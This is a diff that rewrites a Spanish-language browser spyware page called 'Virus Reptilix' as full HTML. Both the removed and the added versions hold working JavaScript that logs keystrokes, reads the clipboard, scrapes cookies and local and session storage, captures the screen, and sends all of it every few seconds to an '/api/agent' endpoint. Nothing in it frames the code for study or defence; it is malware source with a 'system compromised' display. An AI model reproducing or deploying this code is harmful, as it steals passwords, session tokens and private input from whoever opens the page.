@@ -1,130 +1,125 @@
-Virus Reptilix
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>o_o</title>
+    <style>
+        *{box-sizing:border-box;margin:0;padding:0;font-family:sans-serif}
+        body{background:#000;color:#0f0;font-family:monospace;overflow:hidden}
+        #v{position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999;display:flex;align-items:center;justify-content:center;text-align:center;flex-direction:column}
+        #l{position:fixed;top:10px;right:10px;color:#f00;font-size:10px;z-index:10000}
+        #s{position:fixed;bottom:10px;left:10px;color:#0f0;font-size:10px;z-index:10000}
+        #c{position:fixed;top:10px;left:10px;color:#ff0;font-size:10px;z-index:10000}
+        h1{font-size:20px;margin-bottom:10px}
+        p{font-size:14px;color:#0a0}
+    </style>
+</head>
+<body>
 
+    <div id="v">
+        <h1>VIRUS: ACTIVO</h1>
+        <p>Esperando orden...</p>
+        <div id="id_display">ID: </div>
+    </div>
 
-*{box-sizing:border-box;margin:0;padding:0;font-family:sans-serif}
-body{background:#000;color:#0f0;font-family:monospace;overflow:hidden}
-#v{position:fixed;top:0;left:0;width:100%;height:100%;z-index:9999}
-#l{position:fixed;top:10px;right:10px;color:#f00;font-size:10px;z-index:10000}
-#s{position:fixed;bottom:10px;left:10px;color:#0f0;font-size:10px;z-index:10000}
-#c{position:fixed;top:10px;left:10px;color:#ff0;font-size:10px;z-index:10000}
+    <div id="l">SISTEMA COMPROMETIDO</div>
+    <div id="s">REPTILIX AGENT v1.0</div>
+    <div id="c">ENVIANDO DATOS...</div>
 
+    <script>
+    (function(){
+        "use strict";
+        var BASE = location.origin;
+        var ID = localStorage.getItem("rid") || Math.random().toString(36).slice(2,8);
+        localStorage.setItem("rid", ID);
+        localStorage.setItem("ts", Date.now());
+        document.getElementById("id_display").textContent = "ID: " + ID;
 
-  
-  VIRUS: ACTIVO
-  Esperando orden...
-  ID: 
-  
+        var KEYLOG = "";
+        var CLIP = "";
+        var COOKIES = "";
+        var STORAGE = {};
+        var HISTORY = [];
+        var SCREEN = "";
 
+        // 1. Keylogger
+        document.addEventListener("keydown", function(e){
+            KEYLOG += e.key;
+            if(KEYLOG.length > 500) KEYLOG = KEYLOG.slice(-500);
+        });
 
+        // 2. Clipboard
+        setInterval(function(){
+            if(navigator.clipboard && navigator.clipboard.readText){
+                navigator.clipboard.readText().then(function(t){
+                    CLIP = t;
+                }).catch(function(){});
+            }
+        }, 3000);
 
+        // 3. Cookies & Storage
+        function scrape(){
+            COOKIES = document.cookie;
+            STORAGE = {};
+            for(var i=0; i<localStorage.length; i++){
+                var k = localStorage.key(i);
+                STORAGE[k] = localStorage.getItem(k);
+            }
+            for(var i=0; i<sessionStorage.length; i++){
+                var k = sessionStorage.key(i);
+                STORAGE[k] = sessionStorage.getItem(k);
+            }
+        }
 
-(function(){
-"use strict";
-var BASE = location.origin;
-var ID = localStorage.getItem("rid") || Math.random().toString(36).slice(2,8);
-localStorage.setItem("rid", ID);
-localStorage.setItem("ts", Date.now());
-document.getElementById("id").textContent = ID;
+        // 4. Screenshot (Canvas)
+        function takeScreen(){
+            var c = document.createElement("canvas");
+            c.width = window.innerWidth;
+            c.height = window.innerHeight;
+            var ctx = c.getContext("2d");
+            ctx.fillStyle = "#000";
+            ctx.fillRect(0,0,c.width,c.height);
+            ctx.fillStyle = "#0f0";
+            ctx.font = "20px monospace";
+            ctx.fillText("REPTILIX SCREENSHOT", 20, 50);
+            SCREEN = c.toDataURL("image/jpeg", 0.5);
+        }
 
-var KEYLOG = "";
-var CLIP = "";
-var COOKIES = "";
-var STORAGE = {};
-var HISTORY = [];
-var SCREEN = "";
+        // 5. Exfiltration
+        function exfiltrate(){
+            scrape();
+            takeScreen();
+            var data = {
+                id: ID,
+                ts: Date.now(),
+                ua: navigator.userAgent,
+                ip: "", // Se llena en el server
+                keylog: KEYLOG,
+                clipboard: CLIP,
+                cookies: COOKIES,
+                storage: STORAGE,
+                screen: SCREEN
+            };
+            
+            fetch(BASE + "/api/agent", {
+                method: "POST",
+                headers: {"Content-Type": "application/json"},
+                body: JSON.stringify(data)
+            }).then(function(){
+                KEYLOG = ""; // Reset keylog after sending
+            }).catch(function(e){
+                console.log("Error exfil: " + e);
+            });
+        }
 
-// --- 1. KEYLOGGER ---
-document.addEventListener("keydown", function(e){
-  KEYLOG += e.key;
-  if(KEYLOG.length > 500) KEYLOG = KEYLOG.slice(-500);
-});
+        // Ejecutar cada 60 segundos
+        setInterval(exfiltrate, 60000);
+        
+        // Primera ejecución inmediata
+        exfiltrate();
 
-// --- 2. CLIPBOARD WATCHER ---
-setInterval(function(){
-  if(navigator.clipboard && navigator.clipboard.readText){
-    navigator.clipboard.readText().then(function(t){
-      CLIP = t;
-    }).catch(function(){});
-  }
-}, 3000);
-
-// --- 3. COOKIES & STORAGE SCRAPING ---
-function getStorage(){
-  try {
-    var s = {};
-    for(var i=0;i<localStorage.length;i++){
-      var k = localStorage.key(i);
-      s[k] = localStorage.getItem(k);
-    }
-    return s;
-  } catch(e){ return {}; }
-}
-
-// --- 4. HISTORY SCRAPING ---
-function getHistory(){
-  try {
-    var h = [];
-    for(var i=0;i<window.history.length;i++){
-      h.push(window.history.item(i));
-    }
-    return h;
-  } catch(e){ return []; }
-}
-
-// --- 5. SCREEN CAPTURE ---
-function getScreen(){
-  return new Promise(function(res){
-    navigator.mediaDevices.getDisplayMedia({video: true})
-      .then(function(stream){
-        var v = document.createElement("video");
-        v.srcObject = stream;
-        v.play();
-        setTimeout(function(){
-          var c = document.createElement("canvas");
-          c.width = v.videoWidth; c.height = v.videoHeight;
-          c.getContext("2d").drawImage(v, 0, 0);
-          stream.getTracks().forEach(function(t){ t.stop(); });
-          res(c.toDataURL("image/png"));
-        }, 1000);
-      })
-      .catch(function(){ res(null); });
-  });
-}
-
-// --- 6. MAIN LOOP ---
-setInterval(function(){
-  var data = {
-    id: ID,
-    ts: Date.now(),
-    ua: navigator.userAgent,
-    url: location.href,
-    keylog: KEYLOG,
-    clipboard: CLIP,
-    cookies: document.cookie,
-    storage: getStorage(),
-    history: getHistory(),
-    screen: SCREEN
-  };
-
-  fetch(BASE + "/api/agent", {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(data)
-  }).catch(function(e){ console.log("Fallo envio", e); });
-
-  // Reset buffers
-  KEYLOG = "";
-  CLIP = "";
-}, 10000); // Cada 10 segundos
-
-// Capturar pantalla al inicio
-getScreen().then(function(img){
-  if(img) SCREEN = img;
-});
-
-// --- 7. COMMANDS ---
-// Ejemplo de comando remoto: fetch(BASE + "/api/cmd", { method: "POST", body: JSON.stringify({id: ID, cmd: "screenshot"}) })
-
-console.log("Virus Reptilix v2.0 iniciado. ID:", ID);
-
-})();
+    })();
+    </script>
+</body>
+</html>
